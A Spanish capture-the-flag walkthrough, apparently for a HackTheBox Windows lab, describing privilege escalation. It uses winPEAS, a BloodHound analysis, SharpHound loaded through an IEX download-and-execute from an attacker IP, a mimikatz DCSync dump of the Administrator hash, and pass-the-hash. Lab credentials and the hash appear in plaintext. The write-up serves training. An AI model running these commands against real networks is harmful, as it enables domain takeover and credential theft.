## Privilege Escalation {-}

### Rootear la maquina {-}

```powershell
cd C:\Users\Administrator
dir
whoami /priv
whoami /all
net user
```

No tenemos ningun privilegio interessante, tenemos que reconocer el systema.

1. Creamos un directorio para trabajar

    ```powershell
    cd C:\Windows\Temp
    mkdir Recon
    cd Recon
    ```

1. En la maquina de atacante no descargamos el WinPeas

    ```bash
    wget https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe
    mv winPEASx64.exe winPEAS.exe
    ```

1. Lo uploadeamos desde la maquina victima y lo lanzamos

    ```powershell
    upload winPEAS.exe
    ./winPEAS.exe


    ```

    Aqui hemos encontrado unas credenciales para un autologon.

1. Validamos el usuario desde la maquina de atacante

    ```bash
    crackmapexec win rm 10.10.10.175 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
    ```

1. Nos conectamos nuevamente con **Evil-WinRM**

    ```bash
    evil-winrm -i 10.10.10.275 -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
    whoami
    whoami /priv
    whoami /all
    ```

    Nuevamente no encontramos nada muy interesante. Aqui tenemos que tirar de bloodhound

1. En la maquina de atacante preparamos el bloodhound

    ```bash
    sudo apt install neo4j bloodhound -y
    neo4j console

    bloodhoud &> /dev/null & disown

    wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
    python -m http.server 80
    ```

1. Recolectamos data desde la maquina victima

    ```powershell
    cd C:\Windows\Temp
    mkdir privesc
    cd privesc
    IEX(New-Object Net.WebClient).downloadString('http://10.10.17.51/SharpHound.ps1')
    Invoke-BloodHound -CollectionMethod All
    dir
    download 20210908210119_BloodHound.zip
    ```

Una vez el zip en la maquina de atacante, lo cargamos al BloodHound. Cargado vamos a la pestaña Analysis y 
miramos por `Find Shortest Paths to Domain Admins` pero no vemos gran cosa. Miramos el `Find Principals with DCSync Rights`
y vemos que el usuario **svc_loanmgr** tiene privilegios *GetChanges* y *GetChangesAll* sobre el dominio **EGOTISTICAL-BANK.LOCAL**.
Esto significa que podemos hacer un DCSync attack con este usuario.

#### DCSync Attack con mimikatz {-}

Buscamos el mimikatz en nuestra maquina de atacante

```bash
locate mimikatz.exe
cp /usr/share/mimikatz/x64/mimikatz.exe .
python -m http.server 80
```

Lo descargamos en la maquina victima y lo lanzamos para extraer el hash del usuario Administrator.

```powershell
iwr -uri http://10.10.17.51/mimikatz.exe -OutFile mimikatz.exe
C:\Windows\Temp\privesc\mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:Administrator' exit
```

Ahora que hemos recuperado el Hash NTLM del usuario Administrator, podemos hacer un **pass the hash**.

```bash
evil-winrm -i 10.10.10.175 -u 'Administrator' -H 823452073d75b9d1cf70ebdf86c7f98e
```

Ya somos usuario Administrator y podemos leer la flag.
